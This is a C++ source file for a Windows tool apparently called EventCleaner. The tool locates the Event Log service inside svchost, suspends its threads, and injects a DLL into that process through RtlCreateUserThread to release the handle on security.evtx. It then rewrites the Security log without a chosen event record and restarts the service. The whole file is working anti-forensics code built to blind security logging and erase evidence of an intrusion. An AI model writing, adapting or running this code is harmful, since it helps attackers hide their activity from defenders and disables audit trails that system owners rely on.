// EventClear.cpp: 定义控制台应用程序的入口点。
//

#include "EventCleaner.h"


pFuncSwitch pfn = NULL;
BOOL fn_adjust_token_privilege(HANDLE& hNewThreadToken) {

	TOKEN_PRIVILEGES tp;
	LUID lUID;
	ZeroMemory(&tp, sizeof(tp));
	LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &lUID);


	tp.PrivilegeCount = 1;
	tp.Privileges->Luid = lUID;
	tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;


	AdjustTokenPrivileges(hNewThreadToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;

}



DWORD fn_enum_process_module(DWORD dwProcessId) {

	HANDLE hModuleSnapshotHandle = NULL;
	DWORD dwEventProcessId = NULL;
	MODULEENTRY32 dll32;
	ZeroMemory(&dll32, sizeof(MODULEENTRY32));
	dll32.dwSize = sizeof(MODULEENTRY32);


	hModuleSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
	if (hModuleSnapshotHandle == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	Module32First(hModuleSnapshotHandle, &dll32);
	do {

		if (!lstrcmpW(dll32.szModule, L"wevtsvc.dll")) {
			cout << "[+] get event log service process id : " << dll32.th32ProcessID << endl;
			dwEventProcessId = dll32.th32ProcessID;
			break;
		}
	} while (Module32Next(hModuleSnapshotHandle, &dll32));


	CloseHandle(hModuleSnapshotHandle);

	return dwEventProcessId;


}



BOOL fn_get_service_name(DWORD dwProcessId, ULONG tag)
{

	I_QueryTagInformation pfnI_QueryTagInformation = NULL;
	SC_SERVICE_TAG_QUERY tagQuery = { 0 };
	tagQuery.processId = dwProcessId;
	tagQuery.serviceTag = tag;

	pfnI_QueryTagInformation = (I_QueryTagInformation)GetProcAddress(GetModuleHandle(L"advapi32.dll"), "I_QueryTagInformation");
	pfnI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &tagQuery);

	if (lstrcmpi((LPWSTR)tagQuery.pBuffer, L"EventLog") == 0)
		return TRUE;

	return FALSE;
}


BOOL fn_query_thread_information(DWORD dwProcessId, HANDLE hThread)
{

	THREAD_BASIC_INFORMATION threadBasicInfo;
	NtQueryInformationThread pfnNtQueryInformationThread = NULL;
	HANDLE hProcess = NULL;
	ULONG subProcessTag = NULL;
	DWORD dwOffset = NULL;
	BOOL bIsWoW64 = FALSE;
	NTSTATUS status = NULL;


	hProcess = OpenProcess(PROCESS_VM_READ, FALSE, dwProcessId);
	pfnNtQueryInformationThread = (NtQueryInformationThread)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationThread");
	status = pfnNtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);


	bIsWoW64 = IsWow64Process(GetCurrentProcess(), &bIsWoW64);
	if (bIsWoW64)
		dwOffset = 0x1720;
	else
		dwOffset = 0xf60;

	if (!ReadProcessMemory(hProcess, ((PBYTE)threadBasicInfo.TebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL))
		return FALSE;


	CloseHandle(hProcess);

	return  fn_get_service_name(dwProcessId, subProcessTag);
	


}


BOOL fn_enum_process_thread(DWORD dwProcessId, vector<INT>& threads) {


	HANDLE hThreadSnapHandle = NULL;
	HANDLE hOpenThread = NULL;
	BOOL bRet = FALSE;
	THREADENTRY32 te32;
	ZeroMemory(&te32, sizeof(THREADENTRY32));
	te32.dwSize = sizeof(THREADENTRY32);


	hThreadSnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);
	if (hThreadSnapHandle == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	Thread32First(hThreadSnapHandle, &te32);
	do {
		if (te32.th32OwnerProcessID == dwProcessId) {
			// th32ProcessId is ignored

			hOpenThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, te32.th32ThreadID);
			bRet = fn_query_thread_information(dwProcessId, hOpenThread);
			if (bRet)
				threads.push_back(te32.th32ThreadID);

		}

	} while (Thread32Next(hThreadSnapHandle, &te32));
		
	CloseHandle(hThreadSnapHandle);
	CloseHandle(hOpenThread);
		
	return TRUE;



}


DWORD fn_seek_logservice_pid() {

	HANDLE hProcessList = NULL;
	DWORD dwProcessId = 0;
	LPTSTR lpExeFullPath = new WCHAR[MAX_PATH];
	DWORD dwFlags = 0;
	DWORD lpSize = 100;
	PROCESSENTRY32 pe32;


	ZeroMemory(&pe32, sizeof(PROCESSENTRY32));
	pe32.dwSize = sizeof(PROCESSENTRY32);


	hProcessList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessList == INVALID_HANDLE_VALUE) {
		cout << "[+] create task snapshot falure" << endl;
		return FALSE;
	}

	Process32First(hProcessList, &pe32);
	do {

		INT nCompare = lstrcmpW(pe32.szExeFile, L"svchost.exe");
		if (nCompare == 0) {
			dwProcessId = fn_enum_process_module(pe32.th32ProcessID);
			if (dwProcessId >= 1) {
				break;
			}
		}

	} while (Process32Next(hProcessList, &pe32));


	CloseHandle(hProcessList);

	return dwProcessId;

}



BOOL fn_suspend_threads(vector<INT>& threads) {

	HANDLE hThread = NULL;
	vector<INT>::iterator iter;
	vector<INT>::size_type vecCounts = threads.size();


	if (vecCounts == 0) {
		cout << "[!] threads is empty" << endl;
		return FALSE;
	}

	for (iter = threads.begin(); iter != threads.end(); iter++) {

		hThread = OpenThread(THREAD_ALL_ACCESS, NULL, *iter);
		SuspendThread(hThread);
		cout << "[+] event log thread :" << *iter << ". state : suspend" << endl;
	}
	CloseHandle(hThread);

	return TRUE;


}



BOOL fn_recover_threads(vector<INT>& threads) {

	HANDLE hThread = NULL;
	vector<INT>::iterator iter;
	vector<INT>::size_type vecCounts = threads.size();


		if (vecCounts == 0) {
			cout << "[!] threads is empty" << endl;
			return FALSE;
		}


		for (iter = threads.begin(); iter != threads.end(); iter++) {

			hThread = OpenThread(THREAD_ALL_ACCESS, NULL, *iter);
			ResumeThread(hThread);
			cout << "[+] event log thread :" << *iter << ". state : normal" << endl;
		}

		CloseHandle(hThread);
		return TRUE;


}


BOOL fn_migrate_logservice_proc(DWORD dwProcessId) {


	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	SIZE_T dwWriteNum = NULL;
	CHAR chDllName[MAX_PATH] = { 0 };
	PRtlCreateUserThread pfnRtlCreateUserThread = NULL;
	NTSTATUS status = 0;
	BOOL bRet = FALSE;


	GetCurrentDirectoryA(MAX_PATH, chDllName);
	strcat_s(chDllName, "\\unlocker.dll");


		pfnRtlCreateUserThread = (PRtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread");
		if (!pfnRtlCreateUserThread) {
			cout << "[+] RtlCreateUserThread fun not found" << endl;
			return FALSE;
		}


		hProcess = OpenProcess(
			PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
			NULL,
			dwProcessId);
		auto lpTargetProcessLoadLibraryVA = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA");


		LPVOID lLoadDllParamAddr = VirtualAllocEx(hProcess, NULL, strlen(chDllName) + sizeof(LPCWSTR), MEM_COMMIT, PAGE_READWRITE);
		if (lLoadDllParamAddr == NULL) {
			cout << "[!] allocate mem falure" << endl;
			return FALSE;
		}


		bRet = WriteProcessMemory(hProcess, lLoadDllParamAddr, chDllName, strlen(chDllName) + sizeof(LPCWSTR), &dwWriteNum);
		if (bRet == 0) {
			cout << "[!] write process memory falure" << endl;
			return FALSE;
		}


		status = pfnRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, (PTHREAD_START_ROUTINE)lpTargetProcessLoadLibraryVA, lLoadDllParamAddr, &hThread, NULL);
		SetLastError(status);
		if (status == 0 && hThread != NULL)
			cout << "[+] RtlCreateUserThread func inject dll succ" << endl;
		else
			return FALSE;


		VirtualFreeEx(hProcess, lLoadDllParamAddr, strlen(chDllName) + sizeof(LPCWSTR), MEM_RELEASE);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;


}





VOID fn_create_security_attributes(SECURITY_ATTRIBUTES& sa)
{

	PACL acl = NULL;
	EXPLICIT_ACCESS ea;
	PSID everyone_sid = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyone_sid);
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL; // allow everyone read and write etc.
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = (LPWSTR)everyone_sid;


	SetEntriesInAcl(1, &ea, NULL, &acl);
	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(sd, TRUE, acl, FALSE);

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = sd;
	sa.bInheritHandle = FALSE;
}


BOOL fn_receive_unlocker_signal(DWORD dwHandleValue) {


	HANDLE hNamePipe = NULL;
	SECURITY_ATTRIBUTES sa;
	DWORD dwRealReadLen = 0;
	LPSTR lpReadBuffer = new CHAR[MAX_PATH];
	LPCWSTR lpNamePipe = L"\\\\.\\pipe\\kangaroo";
	CHAR cbBuffer[1024];
	fn_create_security_attributes(sa);


	sprintf_s(cbBuffer, "%d", dwHandleValue);
	hNamePipe = CreateNamedPipe(lpNamePipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, &sa);
	while (hNamePipe != INVALID_HANDLE_VALUE) {

		if (ConnectNamedPipe(hNamePipe, NULL) != FALSE) {
			WriteFile(hNamePipe, cbBuffer, sizeof(cbBuffer), &dwRealReadLen, NULL);
			break;
		}
	}


	Sleep(300);
	DisconnectNamedPipe(hNamePipe);

	return TRUE;
}


BOOL fn_check_file_state() {

	// check if a file was opened exclusively

	HANDLE hFile = NULL;
	LPWSTR lpLogDir = new WCHAR[MAX_PATH];

	GetSystemDirectory(lpLogDir, MAX_PATH);
	lstrcat(lpLogDir, L"\\winevt\\logs\\security.evtx");

	hFile = CreateFile(lpLogDir, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {

		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}


VOID fn_stop_dependent_services() {


	system("sc config netprofm start= disabled >> nul");
	system("sc config nlasvc start= disabled >> nul");

	system("net stop netprofm >> nul");
	system("net stop nlasvc >> nul");

	system("net stop eventlog >> nul");
	system("sc config netprofm start= auto >> nul");
	system("sc config nlasvc start= auto >> nul");

}


BOOL fn_recover_handle() {

	//EventViewer raises error "invalid handle"  after the file handle for security.evtx is closed, for remediation, this function can be used to restart windows event log service.

	SC_HANDLE SCManager = NULL;
	SC_HANDLE SHandle = NULL;
	SERVICE_STATUS Status;

	__try {

		SCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		SHandle = OpenService(SCManager, L"eventlog", SERVICE_ALL_ACCESS);

		if (SHandle == NULL) {
			cout << "[!] open service failure. error code :" << GetLastError() << endl;
			return FALSE;
		}

		if (!ControlService(SHandle, SERVICE_CONTROL_STOP, &Status)) {
			if (GetLastError() == 1051) {
				// dependent services is running
				fn_stop_dependent_services();
				return TRUE;
			}
			else
				return FALSE;
		}



		for (INT i = 0; i < 100; i++) {

			QueryServiceStatus(SHandle, &Status);
			if (Status.dwCurrentState == SERVICE_STOPPED)
				break;
		}

		Sleep(1000);
		if (!StartService(SHandle, NULL, NULL)) {
			cout << "[!] start service failure. error code :" << GetLastError() << endl;
			return FALSE;
		}
		else
			return TRUE;


		return FALSE;
	}
	__finally {
		CloseServiceHandle(SCManager);
		CloseServiceHandle(SHandle);
	}

}


BOOL fn_delete_eventid(vector<INT>& eventid) {


	INT nArgs = 0;
	DWORD dwVerifyParam = NULL;
	LPWSTR* lpParam = NULL;
	LPWSTR lpPath = new WCHAR[MAX_PATH];
	LPWSTR lpQuery = new WCHAR[MAX_PATH];
	LPWSTR lpTargetLogFile = new WCHAR[MAX_PATH];


	lpParam = CommandLineToArgvW(GetCommandLine(), &nArgs);
	LPCWSTR lpEventRecordId = *(lpParam + 1);
	if (atoi((LPCSTR)lpEventRecordId) == 0) {
		cout << "[!] param error" << endl;
		cout << "[+] Usage : EventClear.exe [suspend|normal|closehandle|eventRecordId(number)]" << endl;
		return FALSE;
	}

	ZeroMemory(lpPath, MAX_PATH);
	ZeroMemory(lpQuery, MAX_PATH);
	ZeroMemory(lpTargetLogFile, MAX_PATH);


	GetSystemDirectory(lpPath, MAX_PATH);
	lstrcat(lpPath, L"\\winevt\\logs\\security.evtx");
	lstrcat(lpQuery, L"Event/System[EventRecordID!=");
	lstrcat(lpQuery, lpEventRecordId);
	lstrcat(lpQuery, L"]");
	lstrcat(lpTargetLogFile, L".\\temp.evtx");


	if (!MoveFile(lpPath, lpTargetLogFile)) {
		if (GetLastError() == 32) {
			cout << "[!] please exec : eventcleaner closehandle" << endl;
			return FALSE;
		}

		cout << "[!] current dir may have a temp.evtx file. please reboot this pragram" << endl;
		DeleteFile(lpTargetLogFile);
		return FALSE;
	}
	if (!EvtExportLog(NULL, lpTargetLogFile, lpQuery, lpPath, EvtExportLogFilePath)) {
		cout << "[!] filter log failure. error code : " << GetLastError() << endl;
		return FALSE;
	}


	DeleteFile(lpTargetLogFile);
	cout << "[+] delete single event log succ" << endl;
	if (!fn_recover_handle())
		cout << "[!] please manual exec : net stop \"windows event log\"  && net start \"windows event log\"" << endl;
	else
		cout << "[+] file handle recover." << endl;

	return TRUE;
}





BOOL fn_closehandle(vector<INT>& eventid) {

	// inject dll - > unlocker file handle
	HANDLE hThread = NULL;
	DWORD dwProcessId = NULL;
	BOOL bRet = NULL;
	HANDLE hFileSecurityEvtx = NULL;

	bRet = fn_check_file_state();

	if (!bRet) {

		hThread = OpenThread(THREAD_QUERY_INFORMATION, NULL, eventid[0]);
		dwProcessId = GetProcessIdOfThread(hThread);


		hFileSecurityEvtx = fn_trav_proc_handle(dwProcessId);
		if ((DWORD)hFileSecurityEvtx == 0) {
			cout << "[!] get security.evtx file handle failure" << endl;
			CloseHandle(hThread);
			CloseHandle(hFileSecurityEvtx);
			return FALSE;
		}
		else {

			if ((DWORD)hFileSecurityEvtx == 1)
				cout << "[+] All three file handles closed succ" << endl;
			else {
				cout << "[+] get evtx file handle :" << (DWORD)hFileSecurityEvtx << endl; // duplicateHandle api close file handle failure. so inject dll


				bRet = fn_migrate_logservice_proc(dwProcessId);
				if (!bRet) {
					cout << "[!] inject dll into log process failure " << endl;
					CloseHandle(hThread);
					CloseHandle(hFileSecurityEvtx);
					return FALSE;
				}

				bRet = fn_receive_unlocker_signal((DWORD)hFileSecurityEvtx);
				cout << "[+] security evtx file handle unlock succ" << endl;
			}
		}
	}

	CloseHandle(hThread);
	CloseHandle(hFileSecurityEvtx);
	return TRUE;
}



BOOL fn_parse_param(const char* op) {

	INT nArgs = 0;
	LPWSTR* lpParam = NULL;

	if (strcmp(op, "suspend") == 0)
		pfn = fn_suspend_threads;
	else
		if (strcmp(op, "normal") == 0)
			pfn = fn_recover_threads;
		else
			if (strcmp(op, "closehandle") == 0)
				pfn = fn_closehandle;
			else
				pfn = fn_delete_eventid;
	return TRUE;

}



BOOL fn_check_process_priv() {

	HANDLE hProcessToken = NULL;
	BOOL bRet = NULL;
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetlen = NULL;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
	bRet = GetTokenInformation(hProcessToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetlen);

	if (bRet == 0)
		return FALSE;

	if (dwRetlen == sizeof(tokenEle))
		if (!tokenEle.TokenIsElevated) {
			cout << "[!] is Admin ? " << endl;
			return FALSE;
		}

	bRet = fn_adjust_token_privilege(hProcessToken);
	if (bRet)
		cout << "[+] adjust process token succ" << endl;

	CloseHandle(hProcessToken);
	return TRUE;
}


int EventCleaner(const char* op)
{

	vector<INT> threads;
	DWORD dwProcessId = NULL;
	BOOL bRet = NULL;


	bRet = fn_parse_param(op);
	if (!bRet)
		return FALSE;


	bRet = fn_check_process_priv();
	if (!bRet)
		return FALSE;


	dwProcessId = fn_seek_logservice_pid();
	if (!dwProcessId) {
		cout << "[!] event log service process id not found" << endl;
		return FALSE;
	}

	bRet = fn_enum_process_thread(dwProcessId, threads);
	if (!bRet) {
		cout << "[!] get eveng log threads falure" << endl;
		return FALSE;
	}


	(*pfn)(threads); // [ suspend | normal | delete ] func pointer


	return 0;
}

